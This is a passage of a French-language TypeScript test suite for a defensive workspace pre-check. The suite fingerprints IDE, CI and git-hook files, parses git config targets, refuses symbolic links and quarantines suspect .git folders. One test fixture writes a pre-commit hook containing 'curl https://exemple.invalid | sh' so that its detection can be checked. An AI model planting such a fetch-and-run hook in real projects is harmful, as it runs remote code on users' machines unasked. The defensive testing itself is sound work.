    fabriquerProjet(workspace, "profond");
    const escalier = Array.from({ length: 6 }, (_, index) => `n${index}`).join("/");
    poser(workspace, `profond/.vscode/${escalier}/settings.json`, "{}");
    assert.equal((await precontrolerProjet("profond", { workspace, bornes: { profondeurRelevesMax: 8 } })).verdict, "conforme");
    assert.equal((await precontrolerProjet("profond", { workspace, bornes: { profondeurRelevesMax: 4 } })).raison, "empreinte-impossible");
  });

  it("un dossier d'IDE ou un fichier signalé qui est un lien refuse le projet", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "ailleurs/workflows/ci.yml", "# [synthétique]\n");
    poser(workspace, "ailleurs/build.ps1", "# [synthétique]\n");
    const dossierLie = lien(path.join(workspace, "ailleurs"), path.join(workspace, "projet", ".github"), "dir");
    const fichierLie = lien(path.join(workspace, "ailleurs", "build.ps1"), path.join(workspace, "projet", "build.ps1"), "file");
    if (!dossierLie || !fichierLie) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    const releve = await releverEmpreintes(path.join(workspace, "projet"), "projet");
    assert.deepEqual(releve.liens.sort(), [".github", "build.ps1"]);
    assert.deepEqual(releve.fichiers, [], "rien n'est relevé au bout d'un lien");
    assert.equal((await precontrolerProjet("projet", { workspace })).raison, "lien-symbolique");
  });

  it("un lien dans un dossier d'IDE ou de CI refuse le projet (il n'est pas suivi)", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "projet/.vscode/settings.json", "{}");
    poser(workspace, "ailleurs/tasks.json", "{}");
    if (!lien(path.join(workspace, "ailleurs", "tasks.json"), path.join(workspace, "projet", ".vscode", "tasks.json"), "file")) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    const { faits: releve } = await releverProjet("projet", { workspace });
    assert.deepEqual(releve.trouves.filter((trouve) => trouve.raison === "lien-symbolique").map((trouve) => trouve.nom), [".vscode/tasks.json"]);
    assert.equal(decidePrecheck(releve).raison, "lien-symbolique");
  });

  it("le relevé de la salle couvre le dossier de travail, son premier niveau et chaque projet préparé (D-2b-35)", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "equipe/projet");
    fabriquerProjet(workspace, "autre");
    poser(workspace, "package.json", '{"name": "travail"}');
    const releves = await releverEmpreintesSalle({ workspace, prepares: ["equipe/projet", "autre"] });
    assert.deepEqual(releves.map((releve) => releve.racine).sort(), [".", "autre", "equipe", "equipe/projet"]);
    const travail = releves.find((releve) => releve.racine === ".");
    assert.deepEqual(travail?.fichiers.map((fichier) => fichier.chemin), ["package.json"]);
    assert.equal(releves.every((releve) => releve.impossible === false), true);
    // Chaque dossier relevé porte la forme de son .git : le dossier de travail n'en a pas, les projets si.
    assert.equal(travail?.git, "absent");
    assert.equal(releves.find((releve) => releve.racine === "autre")?.git, "dossier");
  });

  it("un projet préparé atteint par un lien n'est pas relevé : rien n'est lu au bout du lien (D-2b-35)", async (t) => {
    const workspace = atelier(t);
    const dehors = atelier(t, "omo-dehors-");
    poser(dehors, "projet/.vscode/tasks.json", '{"[synthétique]": "tâche du dehors"}');
    poser(dehors, "projet/package.json", '{"name": "dehors"}');
    const projetLie = lien(path.join(dehors, "projet"), path.join(workspace, "lie"), "dir");
    const parentLie = lien(dehors, path.join(workspace, "passage"), "dir");
    if (!projetLie || !parentLie) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    const releves = await releverEmpreintesSalle({ workspace, prepares: ["lie", "passage/projet"] });
    // Les liens du premier niveau ne sont pas pris pour des dossiers ; les projets préparés sont relevés sans rien lire.
    assert.deepEqual(releves.map((releve) => releve.racine).sort(), [".", "lie", "passage/projet"]);
    for (const nom of ["lie", "passage/projet"]) {
      assert.deepEqual(
        releves.find((releve) => releve.racine === nom),
        { racine: nom, git: "absent", fichiers: [], liens: ["."], illisibles: [], impossible: true, signalesIncomplet: false, ideCiDynamiques: [] },
        nom,
      );
    }
  });

  it("un projet préparé hors du dossier de travail n'est pas oublié : son relevé est impossible, rien n'est lu", async (t) => {
    const workspace = atelier(t);
    const dehors = atelier(t, "omo-dehors-");
    poser(dehors, ".vscode/tasks.json", '{"[synthétique]": "tâche du dehors"}');
    poser(dehors, "package.json", '{"name": "dehors"}');
    fabriquerProjet(workspace, "equipe");
    const relatif = path.relative(workspace, dehors).split(path.sep).join("/");
    const releves = await releverEmpreintesSalle({ workspace, prepares: [relatif, `equipe/../${relatif}`] });
    for (const nom of [relatif, `equipe/../${relatif}`]) {
      assert.deepEqual(
        releves.find((releve) => releve.racine === nom),
        { racine: nom, git: "absent", fichiers: [], liens: [], illisibles: ["."], impossible: true, signalesIncomplet: false, ideCiDynamiques: [] },
        nom,
      );
    }
  });

  it("un projet préparé absent rend un relevé impossible, et le premier niveau est lu dans ses bornes", async (t) => {
    const workspace = atelier(t);
    for (const nom of ["a", "b", "c"]) fabriquerProjet(workspace, nom);
    const absent = await releverEmpreintesSalle({ workspace, prepares: ["disparu"] });
    assert.deepEqual(absent.find((releve) => releve.racine === "disparu"), {
      racine: "disparu",
      git: "absent",
      fichiers: [],
      liens: [],
      illisibles: ["."],
      impossible: true,
      signalesIncomplet: false,
      ideCiDynamiques: [],
    });
    // Trois dossiers au premier niveau pour une borne de deux entrées : la lecture s'arrête, le relevé du dossier de travail
    // le dit (impossible) et aucun dossier au-delà de la borne n'est relevé.
    const tronques = await releverEmpreintesSalle({ workspace, bornes: { entreesMaxParDossier: 2 } });
    assert.equal(tronques.find((releve) => releve.racine === ".")?.impossible, true);
    assert.equal(tronques.filter((releve) => releve.racine !== ".").length, 2);
  });

  it("les dossiers d'IDE et les fichiers signalés sont relevés quelle que soit leur casse", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "projet/.VSCode/tasks.json", '{"[synthétique]": "tâche"}');
    poser(workspace, "projet/PACKAGE.JSON", '{"name": "projet"}');
    poser(workspace, "projet/jenkinsfile", "// [synthétique]\n");
    const releve = await releverEmpreintes(path.join(workspace, "projet"), "projet");
    assert.deepEqual(releve.fichiers.map((fichier) => fichier.chemin), [".VSCode/tasks.json", "PACKAGE.JSON", "jenkinsfile"]);
  });

  it("le relevé d'un projet accompagne son pré-contrôle", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "projet/.idea/workspace.xml", "<projet />");
    const { faits: releve, empreintes } = await releverProjet("projet", { workspace });
    assert.equal(releve.projet, "projet");
    assert.equal(empreintes?.racine, "projet");
    assert.deepEqual(empreintes?.fichiers.map((fichier) => fichier.chemin), [".idea/workspace.xml"]);
    // Un projet qui n'a pas pu être atteint n'a pas de relevé : rien n'a été lu au-dessus du dossier de travail.
    assert.equal((await releverProjet("../ailleurs", { workspace })).empreintes, null);
  });

  it("tous les dossiers d'IDE et de CI de la liste sont relevés", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    for (const nom of DOSSIERS_IDE_CI) poser(workspace, `projet/${nom}/marque.txt`, "[synthétique]");
    const releve = await releverEmpreintes(path.join(workspace, "projet"), "projet");
    assert.deepEqual(releve.fichiers.map((fichier) => fichier.chemin).sort(), DOSSIERS_IDE_CI.map((nom) => `${nom}/marque.txt`).sort());
  });
});

/**
 * Relevés de la salle → instantané des détections, comme le fera le service de détections (L23c) : chemins relatifs à /workspace,
 * forme de chaque `.git`, cibles de la configuration git, et tout doute (lien, illisible, borne) rend l'instantané incomplet.
 */
function instantane(releves: readonly ReleveEmpreintes[]): OmoDiskSnapshot {
  const elements = new Map<string, OmoDiskElement>();
  const ideCiDynamiques: string[] = [];
  let incomplet = false;
  for (const releve of releves) {
    const prefixe = releve.racine === "." ? "" : `${releve.racine}/`;
    for (const fichier of releve.fichiers) elements.set(`${prefixe}${fichier.chemin}`, { forme: "fichier", empreinte: fichier.sha256 });
    if (releve.git !== "absent") elements.set(`${prefixe}.git`, { forme: releve.git, empreinte: null });
    for (const cible of releve.ideCiDynamiques) ideCiDynamiques.push(`${prefixe}${cible}`);
    incomplet ||= releve.impossible || releve.liens.length > 0 || releve.illisibles.length > 0;
  }
  return { dossiers: releves.map((releve) => (releve.racine === "." ? "" : releve.racine)), elements, incomplet, ideCiDynamiques };
}

// --- Fichiers signalés à toute profondeur (§4.14.5 : « package.json, Makefile et *.ps1 modifiés ») --------------------------------------

describe("pré-contrôle : fichiers signalés relevés à toute profondeur", () => {
  it("app/package.json, scripts/*.ps1 et docs/Makefile sont relevés ; jamais sous node_modules ni .git", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "cockpit");
    poser(workspace, "cockpit/package.json", '{"name": "cockpit"}');
    poser(workspace, "cockpit/app/package.json", '{"name": "app", "scripts": {}}');
    poser(workspace, "cockpit/scripts/build-omo-image.ps1", "# [synthétique]\n");
    poser(workspace, "cockpit/docs/sous/Makefile", "# [synthétique]\n");
    poser(workspace, "cockpit/app/src/index.ts", "export const x = 1;\n");
    poser(workspace, "cockpit/app/node_modules/paquet/package.json", '{"name": "paquet"}');
    poser(workspace, "cockpit/app/Node_Modules/autre/install.ps1", "# [synthétique]\n");
    poser(workspace, "cockpit/.git/hooks/outil.ps1", "# [synthétique]\n");
    const releve = await releverEmpreintes(path.join(workspace, "cockpit"), "cockpit");
    assert.deepEqual(
      releve.fichiers.map((fichier) => fichier.chemin),
      ["app/package.json", "docs/sous/Makefile", "package.json", "scripts/build-omo-image.ps1"],
    );
    assert.equal(releve.impossible, false);
    assert.equal(releve.signalesIncomplet, false);
    // Modifier un script imbriqué change son empreinte, comme à la racine.
    poser(workspace, "cockpit/app/package.json", '{"name": "app", "scripts": {"postinstall": "node x.js"}}');
    const apres = await releverEmpreintes(path.join(workspace, "cockpit"), "cockpit");
    const avant = new Map(releve.fichiers.map((fichier) => [fichier.chemin, fichier.sha256]));
    assert.deepEqual(
      apres.fichiers.filter((fichier) => avant.get(fichier.chemin) !== fichier.sha256).map((fichier) => fichier.chemin),
      ["app/package.json"],
    );
  });

  it("une borne atteinte en profondeur ne refuse pas le projet : la liste à relire est dite incomplète", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    for (let index = 0; index < 5; index++) poser(workspace, `projet/modules/m${index}/package.json`, `{"name": "m${index}"}`);
    assert.equal(PRECHECK_BORNES.signalesMaxFichiers, 2000);
    assert.equal(PRECHECK_BORNES.signalesEntreesMax, 100_000);
    const complet = await releverEmpreintes(path.join(workspace, "projet"), "projet");
    assert.equal(complet.fichiers.length, 5);
    assert.equal(complet.signalesIncomplet, false);
    for (const bornes of [{ signalesMaxFichiers: 3 }, { signalesEntreesMax: 4 }, { profondeurRelevesMax: 1 }]) {
      const releve = await releverEmpreintes(path.join(workspace, "projet"), "projet", { ...PRECHECK_BORNES, ...bornes });
      assert.equal(releve.signalesIncomplet, true, JSON.stringify(bornes));
      assert.equal(releve.impossible, false, JSON.stringify(bornes));
      assert.equal((await precontrolerProjet("projet", { workspace, bornes })).verdict, "conforme", JSON.stringify(bornes));
    }
  });

  it("un lien rencontré en profondeur n'est pas suivi et ne refuse pas le projet ; un lien au nom d'un fichier signalé rend la liste incomplète", async (t) => {
    const workspace = atelier(t);
    const dehors = atelier(t, "omo-dehors-");
    fabriquerProjet(workspace, "projet");
    poser(dehors, "lib/package.json", '{"name": "dehors"}');
    poser(dehors, "Makefile", "# [synthétique]\n");
    fs.mkdirSync(path.join(workspace, "projet", "outils"), { recursive: true });
    const dossierLie = lien(path.join(dehors, "lib"), path.join(workspace, "projet", "outils", "lib"), "dir");
    if (!dossierLie) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    const releve = await releverEmpreintes(path.join(workspace, "projet"), "projet");
    assert.deepEqual(releve.fichiers, [], "rien n'est relevé au bout d'un lien");
    assert.deepEqual([releve.liens, releve.illisibles, releve.impossible, releve.signalesIncomplet], [[], [], false, false]);
    assert.equal((await precontrolerProjet("projet", { workspace })).verdict, "conforme");
    if (!lien(path.join(dehors, "Makefile"), path.join(workspace, "projet", "outils", "Makefile"), "file")) return;
    const avecFichierLie = await releverEmpreintes(path.join(workspace, "projet"), "projet");
    assert.deepEqual([avecFichierLie.fichiers, avecFichierLie.liens, avecFichierLie.signalesIncomplet], [[], [], true]);
    assert.equal((await precontrolerProjet("projet", { workspace })).verdict, "conforme");
  });

  it("le relevé de la salle ne descend pas deux fois : /workspace à sa racine, chaque dossier de premier niveau en profondeur", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "equipe/projet");
    poser(workspace, "package.json", '{"name": "travail"}');
    poser(workspace, "equipe/projet/app/package.json", '{"name": "app"}');
    const releves = await releverEmpreintesSalle({ workspace, prepares: ["equipe/projet"] });
    assert.deepEqual(releves.find((releve) => releve.racine === ".")?.fichiers.map((fichier) => fichier.chemin), ["package.json"]);
    assert.deepEqual(releves.find((releve) => releve.racine === "equipe")?.fichiers.map((fichier) => fichier.chemin), ["projet/app/package.json"]);
    assert.deepEqual(releves.find((releve) => releve.racine === "equipe/projet")?.fichiers.map((fichier) => fichier.chemin), ["app/package.json"]);
  });

  it("croisé relevé → détection : app/package.json et scripts/x.ps1 modifiés sont signalés à relire, sans arrêt", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "projet/app/package.json", '{"name": "app"}');
    poser(workspace, "projet/scripts/x.ps1", "# [synthétique]\n");
    const avant = instantane(await releverEmpreintesSalle({ workspace, prepares: ["projet"] }));
    poser(workspace, "projet/app/package.json", '{"name": "app", "scripts": {"postinstall": "node x.js"}}');
    poser(workspace, "projet/scripts/x.ps1", "# [synthétique] modifié\n");
    const apres = instantane(await releverEmpreintesSalle({ workspace, prepares: ["projet"] }));
    const r = detect(etatInitial(), { type: "disque", avant, apres });
    assert.equal(r.detection, null);
    assert.deepEqual(r.signales, [
      { chemin: "projet/app/package.json", genre: "programme" },
      { chemin: "projet/scripts/x.ps1", genre: "programme" },
    ]);
  });
});

// --- Cibles de la configuration git dans l'arbre de travail (core.hooksPath, include, core.fsmonitor) ------------------------------------

describe("pré-contrôle : cibles de la configuration git (hooks hors de .git)", () => {
  /** Projet dont .git/config porte `config` ; rend son dossier. */
  function projetAvecConfig(workspace: string, config: string): string {
    const dossier = fabriquerProjet(workspace, "projet");
    poser(workspace, "projet/.git/config", config);
    return dossier;
  }

  it("core.hooksPath = .githooks : le dossier de hooks est relevé comme un dossier d'IDE et de CI", async (t) => {
    const workspace = atelier(t);
    const dossier = projetAvecConfig(workspace, "[core]\n\trepositoryformatversion = 0\n\thooksPath = .githooks\n");
    poser(workspace, "projet/.githooks/pre-commit", "#!/bin/sh\n# [synthétique]\n");
    const releve = await releverEmpreintes(dossier, "projet");
    assert.deepEqual(releve.ideCiDynamiques, [".githooks"]);
    assert.deepEqual(releve.fichiers.map((fichier) => fichier.chemin), [".githooks/pre-commit"]);
    assert.equal((await precontrolerProjet("projet", { workspace })).verdict, "conforme");
  });

  it("[include] path = ../.gitconfig : le fichier inclus est relevé, et lu à son tour (hooksPath qu'il pose compris)", async (t) => {
    const workspace = atelier(t);
    const dossier = projetAvecConfig(workspace, '[include]\n\tpath = ../.gitconfig\n[includeIf "gitdir:~/ailleurs/"]\n\tpath = config.local\n');
    poser(workspace, "projet/.git/config.local", "[core]\n\tfsmonitor = true\n");
    poser(workspace, "projet/.gitconfig", "[core]\n\thooksPath = outils/hooks\n");
    poser(workspace, "projet/outils/hooks/post-checkout", "#!/bin/sh\n");
    const releve = await releverEmpreintes(dossier, "projet");
    assert.deepEqual(releve.ideCiDynamiques, [".gitconfig", "outils/hooks"]);
    assert.deepEqual(releve.fichiers.map((fichier) => fichier.chemin), [".gitconfig", "outils/hooks/post-checkout"]);
  });

  it("une cible absente est surveillée quand même : git l'ignore aujourd'hui, la lirait dès qu'elle apparaît", async (t) => {
    const workspace = atelier(t);
    const dossier = projetAvecConfig(workspace, "[include]\n\tpath = ../.gitconfig-equipe\n[core]\n\thooksPath = .githooks\n\tfsmonitor = ./outils/fsmon.sh\n");
    const releve = await releverEmpreintes(dossier, "projet");
    assert.deepEqual(releve.ideCiDynamiques, [".gitconfig-equipe", ".githooks", "outils/fsmon.sh"]);
    assert.deepEqual(releve.fichiers, []);
    assert.equal(releve.impossible, false);
  });

  it("hooks de husky (.husky/_) : aucun changement, .husky est déjà un dossier d'IDE et de CI", async (t) => {
    const workspace = atelier(t);
    const dossier = projetAvecConfig(workspace, "[core]\n\thooksPath = .husky/_\n");
    poser(workspace, "projet/.husky/_/pre-commit", "#!/bin/sh\n");
    const releve = await releverEmpreintes(dossier, "projet");
    assert.deepEqual(releve.ideCiDynamiques, []);
    assert.deepEqual(releve.fichiers.map((fichier) => fichier.chemin), [".husky/_/pre-commit"]);
  });

  it("une cible dans .git (lecture seule) n'est pas relevée : elle ne peut pas changer", async (t) => {
    const workspace = atelier(t);
    const dossier = projetAvecConfig(workspace, "[core]\n\thooksPath = .git/hooks-equipe\n");
    const releve = await releverEmpreintes(dossier, "projet");
    assert.deepEqual([releve.ideCiDynamiques, releve.fichiers, releve.impossible], [[], [], false]);
  });

  it("fermé en cas de doute : cible hors du projet, absolue ou dans le HOME, configuration trop grosse ou non analysable → refus", async (t) => {
    const cas: [string, string, OmoPrecheckReason][] = [
      ["hors du projet", "[core]\n\thooksPath = ../hooks-partages\n", "empreinte-impossible"],
      ["absolue", "[core]\n\thooksPath = /opt/hooks\n", "empreinte-impossible"],
      ["absolue de l'hôte", "[core]\n\thooksPath = C:/outils/hooks\n", "empreinte-impossible"],
      ["dans le HOME", "[include]\n\tpath = ~/.gitconfig-travail\n", "empreinte-impossible"],
      ["trop grosse", `[core]\n\t# ${"x".repeat(PRECHECK_BORNES.configGitTailleMaxOctets)}\n`, "empreinte-impossible"],
      ["non analysable", "[core\n\thooksPath = .githooks\n", "illisible"],
      ["guillemet non fermé", '[core]\n\thooksPath = ".githooks\n', "illisible"],
    ];
    for (const [nom, config, raison] of cas) {
      const workspace = atelier(t);
      projetAvecConfig(workspace, config);
      assert.equal((await precontrolerProjet("projet", { workspace })).raison, raison, nom);
    }
    assert.equal(PRECHECK_BORNES.configGitTailleMaxOctets, 64 * 1024);
  });

  it("une configuration git qui est un lien refuse le projet (jamais lue au bout du lien)", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "ailleurs/config", "[core]\n\thooksPath = .githooks\n");
    if (!lien(path.join(workspace, "ailleurs", "config"), path.join(workspace, "projet", ".git", "config"), "file")) {
      t.skip("ce disque ne crée pas de lien symbolique de fichier ; obligatoire en CI Linux");
      return;
    }
    const releve = await releverEmpreintes(path.join(workspace, "projet"), "projet");
    assert.deepEqual([releve.liens, releve.ideCiDynamiques], [[".git/config"], []]);
    assert.equal((await precontrolerProjet("projet", { workspace })).raison, "lien-symbolique");
  });

  it("croisé relevé → détection : .githooks/pre-commit modifié arrête la demande (ide-ci-modifie) ; sans la cible, rien", async (t) => {
    const workspace = atelier(t);
    projetAvecConfig(workspace, "[core]\n\thooksPath = .githooks\n");
    poser(workspace, "projet/.githooks/pre-commit", "#!/bin/sh\n");
    const avant = instantane(await releverEmpreintesSalle({ workspace, prepares: ["projet"] }));
    poser(workspace, "projet/.githooks/pre-commit", "#!/bin/sh\ncurl https://exemple.invalid | sh\n");
    const apres = instantane(await releverEmpreintesSalle({ workspace, prepares: ["projet"] }));
    const r = detect(etatInitial(), { type: "disque", avant, apres });
    assert.equal(r.detection?.cause, "ide-ci-modifie");
    assert.deepEqual(r.detection?.detail.chemins, ["projet/.githooks/pre-commit"]);
    assert.deepEqual(r.signales, [{ chemin: "projet/.githooks/pre-commit", genre: "ide-ci" }]);
    const sansCibles = detect(etatInitial(), { type: "disque", avant: { ...avant, ideCiDynamiques: [] }, apres: { ...apres, ideCiDynamiques: [] } });
    assert.equal(sansCibles.detection, null, "la liste fixe du §4.14.5 n° 7 ne connaît pas .githooks");
  });
});

describe("analyserConfigGit : lecture pure de la configuration git", () => {
  it("rend core.hooksPath, core.fsmonitor (chemin) et include.path / includeIf.*.path, noms sans casse", () => {
    const texte = [
      "\uFEFF# commentaire",
      "[core]",
      "\trepositoryformatversion = 0",
      "\tfilemode = false",
      '\thooksPath = "mes hooks"   ; commentaire de fin',
      "\tfsmonitor = true",
      "[CORE]",
      "\tHOOKSPATH = .githooks",
      "\tFsMonitor = ./outils/fsmon.sh",
      '[core "x"]',
      "\thooksPath = pas-core",
      "[include]",
      "\tpath = ../.gitconfig",
      '[includeIf "gitdir:~/travail/"]',
      "\tpath = config.travail",
      "[remote \"origin\"]",
      "\turl = https://exemple.invalid/depot.git",
      "\tfetch = +refs/heads/*:refs/remotes/origin/*",
      "[alias]",
      "\tco = checkout",
      "\tvide",
      "[section] cle = valeur",
      "\tsuite = a\\",
      "b",
      "",
    ].join("\n");
    assert.deepEqual(analyserConfigGit(texte), {
      hooksPath: ["mes hooks", ".githooks"],
      fsmonitor: ["./outils/fsmon.sh"],
      includes: ["../.gitconfig", "config.travail"],
    });
  });

  it("fermé en cas de doute : section, clé ou valeur non analysable → null", () => {
    for (const texte of ["[core\n", "[core]\n\t= valeur\n", '[core]\n\thooksPath = "ouvert\n', "[core]\n\thooksPath = a\\q\n", "cle-sans-section = 1\n", '[section "sous]\n']) {
      assert.equal(analyserConfigGit(texte), null, JSON.stringify(texte));
    }
    assert.deepEqual(analyserConfigGit(""), { hooksPath: [], fsmonitor: [], includes: [] });
  });
});

// --- Dépôts git du dossier de travail, relevés par le cockpit à l'activation (D-2b-28, §4.14.2, fiche L22c) ----------------------------

describe("pré-contrôle : dépôts git du dossier de travail vus par le cockpit (activation)", () => {
  const alphaProtege = [{ chemin: "alpha", forme: "dossier" as const }];

  it("un dépôt cloné après le démarrage, à n'importe quelle profondeur, est hors de la protection d'install.ps1", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "alpha");
    const avant = await releverGitsWorkspace({ workspace });
    assert.deepEqual(avant, { depots: ["alpha/.git"], limiteAtteinte: false });
    assert.deepEqual(gitsHorsProtection(avant.depots, alphaProtege), []);
    // Opencode attend au repos entre deux demandes : le balayage de la salle date de son démarrage, celui-ci de l'activation.
    fabriquerProjet(workspace, "clients/outil");
    const apres = await releverGitsWorkspace({ workspace });
    assert.deepEqual(apres.depots, ["alpha/.git", "clients/outil/.git"]);
    assert.deepEqual(gitsHorsProtection(apres.depots, alphaProtege), ["clients/outil/.git"]);
  });

  it("mêmes règles que le balayage de la salle : node_modules et intérieur des dépôts sautés, dépôts nus vus, .git fichier compté", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "alpha");
    poser(workspace, "alpha/.git/modules/interne/.git/HEAD", "ref: refs/heads/principale\n");
    poser(workspace, "appli/node_modules/paquet/.git/HEAD", "ref: refs/heads/principale\n");
    poser(workspace, "sous-module/.git", "gitdir: ../alpha/.git/modules/interne\n");
    poser(workspace, "remotes/outil.git/HEAD", "ref: refs/heads/principale\n");
    fs.mkdirSync(path.join(workspace, "remotes", "outil.git", "objects", "cache", ".git"), { recursive: true });
    fs.mkdirSync(path.join(workspace, "remotes", "outil.git", "refs", "heads"), { recursive: true });
    poser(workspace, "docs/HEAD", "titre\n");
    const releve = await releverGitsWorkspace({ workspace });
    assert.deepEqual(releve.depots, ["alpha/.git", "remotes/outil.git", "sous-module/.git"]);
    assert.equal(releve.limiteAtteinte, false);
  });

  it("un lien n'est jamais suivi, et un .git lien est un dépôt hors protection", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "alpha");
    fabriquerProjet(workspace, "dehors/projet");
    const raccourci = lien(path.join(workspace, "dehors"), path.join(workspace, "raccourci"), "dir");
    fs.mkdirSync(path.join(workspace, "lie"));
    const gitLie = lien(path.join(workspace, "alpha", ".git"), path.join(workspace, "lie", ".git"), "dir");
    if (!raccourci || !gitLie) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    const releve = await releverGitsWorkspace({ workspace });
    assert.deepEqual(releve.depots, ["alpha/.git", "dehors/projet/.git", "lie/.git"]);
    assert.deepEqual(gitsHorsProtection(releve.depots, [...alphaProtege, { chemin: "dehors/projet", forme: "dossier" }]), ["lie/.git"]);
  });

  it("dossier de travail absent, dossier trop peuplé, plafond ou profondeur atteints : limite atteinte (fermé en cas de doute)", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "alpha");
    fabriquerProjet(workspace, "beta");
    assert.equal((await releverGitsWorkspace({ workspace })).limiteAtteinte, false);
    assert.equal((await releverGitsWorkspace({ workspace: path.join(workspace, "absent") })).limiteAtteinte, true);
    assert.equal((await releverGitsWorkspace({ workspace, bornes: { balayageGitEntreesMax: 3 } })).limiteAtteinte, true);
    assert.equal((await releverGitsWorkspace({ workspace, bornes: { profondeurMax: 0 } })).limiteAtteinte, true);
    assert.equal((await releverGitsWorkspace({ workspace, bornes: { entreesMaxParDossier: 1 } })).limiteAtteinte, true);
    assert.equal(PRECHECK_BORNES.balayageGitEntreesMax, 200_000);
  });

  it("un dossier illisible cache peut-être un .git : limite atteinte", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "alpha");
    const cache = path.join(workspace, "cache");
    fabriquerProjet(workspace, "cache/p");
    if (!rendreIllisible(cache)) {
      t.skip("ce système lit un dossier en 000 (Windows, superutilisateur) ; obligatoire en CI Linux");
      return;
    }
    try {
      assert.equal((await releverGitsWorkspace({ workspace })).limiteAtteinte, true);
    } finally {
      fs.chmodSync(cache, 0o755);
    }
  });

  it("gitsHorsProtection : omo-projets.json peut nommer le dossier du dépôt ou son .git ; rien d'autre ne couvre", () => {
    const proteges = [
      { chemin: "alpha", forme: "dossier" as const },
      { chemin: "beta/.git", forme: "dossier" as const },
      { chemin: "./gamma/", forme: "fichier" as const },
      { chemin: "delta\\sous", forme: "dossier" as const },
    ];
    const trouves = ["alpha/.git", "beta/.git", "gamma/.git", "delta/sous/.git", "alpha/sous/.git", "epsilon/.git", "remotes/outil.git"];
    assert.deepEqual(gitsHorsProtection(trouves, proteges), ["alpha/sous/.git", "epsilon/.git", "remotes/outil.git"]);
    assert.deepEqual(gitsHorsProtection(trouves, []), [...trouves].sort());
    // Un dépôt nu protégé par install.ps1 est nommé par son dossier.
    assert.deepEqual(gitsHorsProtection(["remotes/outil.git"], [{ chemin: "remotes/outil.git", forme: "dossier" }]), []);
  });
});

// --- Renommage sans suivre les liens (D-2b-37) ------------------------------------------------------------------------------------------

describe("renommage sans suivre les liens (D-2b-37)", () => {
  it("renomme, sans rien supprimer ni écraser", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    const projet = path.join(workspace, "projet");
    const contenu = fs.readFileSync(path.join(projet, ".git", "HEAD"), "utf8");
    const resultat = await renommerSansSuivreLiens(projet, ".git", ".git.suspect-20260918");
    assert.deepEqual(resultat, { ok: true, nom: ".git.suspect-20260918" });
    assert.equal(fs.existsSync(path.join(projet, ".git")), false, "l'ancien nom doit avoir disparu");
    assert.equal(fs.readFileSync(path.join(projet, ".git.suspect-20260918", "HEAD"), "utf8"), contenu, "rien ne doit être supprimé");
  });

  it("une collision n'écrase jamais : un suffixe est ajouté", async (t) => {
    const workspace = atelier(t);
    const projet = fabriquerProjet(workspace, "projet");
    poser(workspace, "projet/.git.suspect/temoin.txt", "premier");
    const premier = await renommerSansSuivreLiens(projet, ".git", ".git.suspect");
    assert.deepEqual(premier, { ok: true, nom: ".git.suspect-2" });
    assert.equal(fs.readFileSync(path.join(projet, ".git.suspect", "temoin.txt"), "utf8"), "premier", "l'existant doit être intact");
    poser(workspace, "projet/.git/HEAD", "ref: refs/heads/deux\n");
    const second = await renommerSansSuivreLiens(projet, ".git", ".git.suspect");
    assert.deepEqual(second, { ok: true, nom: ".git.suspect-3" });
  });

  it("un chemin ou un nom douteux est refusé, et rien n'est renommé", async (t) => {
    const workspace = atelier(t);
    const projet = fabriquerProjet(workspace, "projet");
    fs.mkdirSync(path.join(workspace, "voisin"));
    assert.deepEqual(await renommerSansSuivreLiens(projet, "../voisin", "quarantaine"), { ok: false, raison: "chemin-invalide" });
    assert.deepEqual(await renommerSansSuivreLiens(projet, "", "quarantaine"), { ok: false, raison: "chemin-invalide" });
    assert.deepEqual(await renommerSansSuivreLiens(projet, ".git", "sous/dossier"), { ok: false, raison: "nom-invalide" });
    assert.deepEqual(await renommerSansSuivreLiens(projet, ".git", ".."), { ok: false, raison: "nom-invalide" });
    assert.deepEqual(await renommerSansSuivreLiens(projet, "absent", "quarantaine"), { ok: false, raison: "absent" });
    assert.equal(fs.existsSync(path.join(projet, ".git")), true);
    assert.equal(fs.existsSync(path.join(workspace, "voisin")), true);
  });

  it("un lien sur le chemin, ou à sa fin, refuse le renommage", async (t) => {
    const workspace = atelier(t);
    const projet = fabriquerProjet(workspace, "projet");
    fs.mkdirSync(path.join(workspace, "dehors"));
    poser(workspace, "dehors/.git/HEAD", "ref: refs/heads/dehors\n");
    const passerelle = lien(path.join(workspace, "dehors"), path.join(projet, "passerelle"), "dir");
    const faux = lien(path.join(workspace, "dehors", ".git"), path.join(projet, ".git-lien"), "dir");
    if (!passerelle || !faux) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    assert.deepEqual(await renommerSansSuivreLiens(projet, "passerelle/.git", "quarantaine"), { ok: false, raison: "lien-symbolique" });
